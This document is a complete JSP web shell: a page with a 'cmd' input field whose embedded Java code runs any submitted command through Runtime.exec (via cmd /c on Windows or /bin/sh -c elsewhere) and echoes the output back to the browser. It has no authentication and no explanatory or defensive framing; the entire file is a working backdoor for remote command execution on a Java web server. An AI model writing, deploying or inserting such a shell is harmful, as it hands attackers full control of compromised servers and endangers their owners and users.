<!DOCTYPE html>
<html>
<head>
   <title></title>
</head>
<body>
   <form method="GET" action="webshell.jsp">
      <input type="text" name="cmd">
      <input type="submit" value="Execute">
   </form>
   <%@ page import="java.io.*" %>
   <%
      String cmd = request.getParameter("cmd");
      String OS = System.getProperty("os.name");
      String[] cmdarr;
      String output = "";
      if (cmd != null) {
         String s = null;
         if (OS.startsWith("Windows")) {
            cmdarr = new String[] {"cmd", "/c", cmd};
         }
         else {
            cmdarr = new String[] {"/bin/sh", "-c", cmd};
         }
         try {
            Process p = Runtime.getRuntime().exec(cmdarr);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) {
               output += s.replace("<", "&lt;").replace(">", "&gt;") + "<br>";
            }
         }  catch(IOException e) {
            e.printStackTrace();
         }
      }
   %>
   <pre>
      <%=output %>
   </pre>
</body>
</html>
